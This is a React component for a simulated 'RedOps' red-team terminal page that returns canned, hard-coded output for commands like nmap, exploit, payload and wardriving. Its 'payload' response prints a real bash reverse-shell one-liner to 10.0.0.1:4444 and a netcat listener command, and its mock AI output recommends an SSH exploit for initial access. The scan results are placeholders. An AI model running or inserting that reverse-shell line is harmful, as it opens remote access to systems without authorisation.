"use client";

import { useState, useRef, useEffect } from "react";
import { Terminal, Plus, X, Maximize2, Minimize2, RefreshCw } from "lucide-react";

type TermLine = { type: "prompt" | "output" | "error" | "success" | "warning" | "info"; text: string };

const commandResponses: Record<string, TermLine[]> = {
  help: [
    { type: "info", text: "RedOps Terminal v1.0 — Available Commands:" },
    { type: "output", text: "  nmap <target>          — Network/port scanner" },
    { type: "output", text: "  scan <target>          — Quick vulnerability scan" },
    { type: "output", text: "  exploit <cve>          — Search exploit database" },
    { type: "output", text: "  payload <type>         — Generate payload" },
    { type: "output", text: "  wardriving start/stop  — Control war driving" },
    { type: "output", text: "  ai <query>             — Query AI engine" },
    { type: "output", text: "  db list                — List network database" },
    { type: "output", text: "  clear                  — Clear terminal" },
    { type: "output", text: "  whoami                 — Current user info" },
    { type: "output", text: "  ifconfig               — Network interfaces" },
    { type: "output", text: "  netstat                — Active connections" },
  ],
  whoami: [
    { type: "success", text: "redops-operator" },
    { type: "output", text: "uid=1000(operator) gid=1000(operator) groups=1000(operator),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)" },
  ],
  ifconfig: [
    { type: "output", text: "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500" },
    { type: "output", text: "        inet 192.168.1.100  netmask 255.255.255.0  broadcast 192.168.1.255" },
    { type: "output", text: "        inet6 fe80::a00:27ff:fe4e:66a1  prefixlen 64  scopeid 0x20<link>" },
    { type: "output", text: "        ether 08:00:27:4e:66:a1  txqueuelen 1000  (Ethernet)" },
    { type: "output", text: "" },
    { type: "output", text: "wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500" },
    { type: "output", text: "        inet 10.0.0.5  netmask 255.255.255.0  broadcast 10.0.0.255" },
    { type: "output", text: "        ether aa:bb:cc:dd:ee:ff  txqueuelen 1000  (Ethernet)" },
  ],
  netstat: [
    { type: "output", text: "Active Internet connections (w/o servers)" },
    { type: "output", text: "Proto Recv-Q Send-Q Local Address           Foreign Address         State" },
    { type: "success", text: "tcp        0      0 192.168.1.100:4444      0.0.0.0:*               LISTEN" },
    { type: "output", text: "tcp        0      0 192.168.1.100:22        192.168.1.1:52341       ESTABLISHED" },
    { type: "output", text: "tcp        0      0 192.168.1.100:443       142.250.80.46:443       ESTABLISHED" },
  ],
  "db list": [
    { type: "info", text: "Network Database — 8 entries:" },
    { type: "output", text: "ID  SSID                    BSSID              SECURITY  SIGNAL" },
    { type: "output", text: "──────────────────────────────────────────────────────────────" },
    { type: "success", text: "1   HomeNetwork_5G          AA:BB:CC:DD:EE:01  WPA3      -42 dBm" },
    { type: "warning", text: "2   CoffeeShop_Guest        AA:BB:CC:DD:EE:02  Open      -67 dBm" },
    { type: "output", text: "3   NETGEAR_5G_EXT          AA:BB:CC:DD:EE:03  WPA2      -55 dBm" },
    { type: "output", text: "4   ATT-WIFI-7823           AA:BB:CC:DD:EE:04  WPA2      -71 dBm" },
    { type: "warning", text: "5   xfinitywifi             AA:BB:CC:DD:EE:05  Open      -78 dBm" },
    { type: "output", text: "6   TP-Link_2.4G_9A3F       AA:BB:CC:DD:EE:06  WPA2      -61 dBm" },
    { type: "output", text: "7   DIRECT-Samsung-TV       AA:BB:CC:DD:EE:07  WPA2      -48 dBm" },
    { type: "output", text: "8   HiddenNetwork           AA:BB:CC:DD:EE:08  WPA2      -83 dBm" },
  ],
  "wardriving start": [
    { type: "info", text: "[*] Initializing war driving module..." },
    { type: "info", text: "[*] Acquiring GPS lock..." },
    { type: "success", text: "[+] GPS lock acquired: 40.7128°N 74.0060°W" },
    { type: "info", text: "[*] Setting wlan0 to monitor mode..." },
    { type: "success", text: "[+] wlan0mon interface created" },
    { type: "info", text: "[*] Starting channel hopping (1-165)..." },
    { type: "success", text: "[+] War driving active. Networks will be logged to database." },
  ],
  "wardriving stop": [
    { type: "warning", text: "[!] Stopping war driving..." },
    { type: "info", text: "[*] Disabling monitor mode..." },
    { type: "success", text: "[+] wlan0 restored to managed mode" },
    { type: "success", text: "[+] Session saved: 8 networks discovered" },
  ],
};

const getResponse = (cmd: string): TermLine[] => {
  const lower = cmd.toLowerCase().trim();
  if (commandResponses[lower]) return commandResponses[lower];
  if (lower.startsWith("nmap ")) {
    const target = cmd.split(" ").slice(1).join(" ");
    return [
      { type: "info", text: `Starting Nmap 7.94 scan on ${target}` },
      { type: "output", text: "Nmap scan report for " + target },
      { type: "output", text: "Host is up (0.0023s latency)." },
      { type: "success", text: "22/tcp   open  ssh        OpenSSH 7.4" },
      { type: "success", text: "80/tcp   open  http       Apache httpd 2.4.6" },
      { type: "success", text: "443/tcp  open  ssl/https  nginx 1.18.0" },
      { type: "warning", text: "| vuln: CVE-2024-1234 - VULNERABLE" },
      { type: "output", text: "Nmap done: 1 IP address scanned in 12.34 seconds" },
    ];
  }
  if (lower.startsWith("scan ")) {
    return [
      { type: "info", text: "[*] Running vulnerability scan..." },
      { type: "info", text: "[*] Checking CVE database..." },
      { type: "error", text: "[!] CRITICAL: CVE-2024-1234 detected (CVSS 9.8)" },
      { type: "warning", text: "[!] HIGH: CVE-2023-44487 detected (CVSS 7.5)" },
      { type: "success", text: "[+] Scan complete. 2 vulnerabilities found." },
    ];
  }
  if (lower.startsWith("exploit ")) {
    const cve = cmd.split(" ").slice(1).join(" ");
    return [
      { type: "info", text: `[*] Searching exploit-db for ${cve}...` },
      { type: "success", text: `[+] Found: EDB-51234 — Remote Code Execution` },
      { type: "output", text: "    Platform: Linux" },
      { type: "output", text: "    Type: Remote" },
      { type: "output", text: "    Author: security-researcher" },
      { type: "info", text: "[*] Use 'payload reverse' to generate exploit payload" },
    ];
  }
  if (lower.startsWith("payload ")) {
    return [
      { type: "info", text: "[*] Generating payload..." },
      { type: "success", text: "[+] Payload generated:" },
      { type: "output", text: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" },
      { type: "info", text: "[*] Start listener: nc -lvnp 4444" },
    ];
  }
  if (lower.startsWith("ai ")) {
    return [
      { type: "info", text: "[*] Querying AI engine..." },
      { type: "success", text: "[+] AI Analysis: Multiple attack vectors identified" },
      { type: "output", text: "    1. SSH buffer overflow (CVE-2024-1234) — Critical" },
      { type: "output", text: "    2. HTTP/2 DoS (CVE-2023-44487) — High" },
      { type: "output", text: "    3. Default credentials likely on port 1433" },
      { type: "info", text: "[*] Recommended: Start with SSH exploit for initial access" },
    ];
  }
  if (lower === "clear") return [];
  return [{ type: "error", text: `Command not found: ${cmd}. Type 'help' for available commands.` }];
};

type Tab = { id: string; title: string; lines: TermLine[]; input: string };

export default function TerminalPage() {
  const [tabs, setTabs] = useState<Tab[]>([
    { id: "1", title: "Terminal 1", lines: [
      { type: "info", text: "RedOps Terminal v1.0 — Type 'help' for commands" },
      { type: "output", text: "Connected to RedOps Platform" },
    ], input: "" }
  ]);
  const [activeTab, setActiveTab] = useState("1");
  const [isFullscreen, setIsFullscreen] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);
  const bottomRef = useRef<HTMLDivElement>(null);

  const activeTabData = tabs.find(t => t.id === activeTab)!;

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [activeTabData?.lines]);

  const handleCommand = (cmd: string) => {
    if (!cmd.trim()) return;
    const response = getResponse(cmd);
    setTabs(prev => prev.map(t => {
      if (t.id !== activeTab) return t;
      const newLines = cmd.toLowerCase().trim() === "clear"
        ? []
        : [...t.lines, { type: "prompt" as const, text: `$ ${cmd}` }, ...response];
      return { ...t, lines: newLines, input: "" };
    }));
  };

  const addTab = () => {
    const id = Date.now().toString();
    setTabs(prev => [...prev, {
      id, title: `Terminal ${prev.length + 1}`,
      lines: [{ type: "info", text: "New terminal session" }],
      input: ""
    }]);
    setActiveTab(id);
  };

  const closeTab = (id: string) => {
    if (tabs.length === 1) return;
    setTabs(prev => prev.filter(t => t.id !== id));
    if (activeTab === id) setActiveTab(tabs[0].id);
  };

  return (
    <div className={`flex flex-col ${isFullscreen ? "fixed inset-0 z-50" : "h-screen"} bg-[#050a0f]`}>
      {/* Tab Bar */}
      <div className="flex items-center bg-[#0a1520] border-b border-[#1a3a4a] flex-shrink-0">
        <div className="flex items-center gap-1 px-3 py-2 flex-1 overflow-x-auto">
          {tabs.map(tab => (
            <div
              key={tab.id}
              className={`flex items-center gap-2 px-3 py-1.5 rounded-t border-b-2 cursor-pointer transition-all flex-shrink-0 ${
                activeTab === tab.id
                  ? "border-[#00ff88] bg-[rgba(0,255,136,0.05)] text-[#00ff88]"
                  : "border-transparent text-[#3d6b7a] hover:text-[#7ab8cc]"
              }`}
              onClick={() => setActiveTab(tab.id)}
            >
              <Terminal className="w-3 h-3" />
              <span className="text-xs">{tab.title}</span>
              {tabs.length > 1 && (
                <button
                  onClick={(e) => { e.stopPropagation(); closeTab(tab.id); }}
                  className="text-[#3d6b7a] hover:text-[#ff3366] ml-1"
                >
                  <X className="w-3 h-3" />
                </button>
              )}
            </div>
          ))}
          <button
            onClick={addTab}
            className="p-1.5 text-[#3d6b7a] hover:text-[#00d4ff] transition-colors flex-shrink-0"
          >
            <Plus className="w-3.5 h-3.5" />
          </button>
        </div>
        <div className="flex items-center gap-1 px-3">
          <button
            onClick={() => setTabs(prev => prev.map(t => t.id === activeTab ? { ...t, lines: [] } : t))}
            className="p-1.5 text-[#3d6b7a] hover:text-[#00d4ff] transition-colors"
            title="Clear"
          >
            <RefreshCw className="w-3.5 h-3.5" />
          </button>
          <button
            onClick={() => setIsFullscreen(!isFullscreen)}
            className="p-1.5 text-[#3d6b7a] hover:text-[#00d4ff] transition-colors"
          >
            {isFullscreen ? <Minimize2 className="w-3.5 h-3.5" /> : <Maximize2 className="w-3.5 h-3.5" />}
          </button>
        </div>
      </div>

      {/* Terminal Output */}
      <div
        className="flex-1 overflow-y-auto p-4 font-mono text-xs cursor-text"
        onClick={() => inputRef.current?.focus()}
      >
        {activeTabData.lines.map((line, i) => (
          <div key={i} className={`leading-relaxed mb-0.5 terminal-${line.type}`}>
            {line.text}
          </div>
        ))}

        {/* Input Line */}
        <div className="flex items-center gap-2 mt-1">
          <span className="terminal-prompt">$</span>
          <input
            ref={inputRef}
            type="text"
            value={activeTabData.input}
            onChange={(e) => setTabs(prev => prev.map(t => t.id === activeTab ? { ...t, input: e.target.value } : t))}
            onKeyDown={(e) => {
              if (e.key === "Enter") {
                handleCommand(activeTabData.input);
              }
            }}
            className="flex-1 bg-transparent outline-none text-[#e0f4ff] caret-[#00ff88]"
            autoFocus
            spellCheck={false}
            autoComplete="off"
          />
          <span className="animate-blink text-[#00ff88]">█</span>
        </div>
        <div ref={bottomRef} />
      </div>
    </div>
  );
}
